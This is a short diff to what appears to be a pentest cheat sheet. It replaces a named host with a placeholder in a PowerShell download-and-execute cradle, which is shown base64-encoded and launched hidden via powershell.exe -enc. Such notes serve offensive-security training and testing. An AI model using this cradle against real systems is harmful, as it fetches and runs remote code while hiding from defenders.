@@ -68,7 +68,7 @@ powershell.exe -nop -w hidden -enc <BASE64 STRING>
 
 #### Base64 encoded commands on Linux
 ```
-set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+set str 'IEX ((new-object net.webclient).downloadstring("http://<IP>.com/a"))'
 echo -en $str | iconv -t UTF-16LE | base64 -w 0
 
 powershell.exe -nop -w hidden -enc <BASE64 STRING>
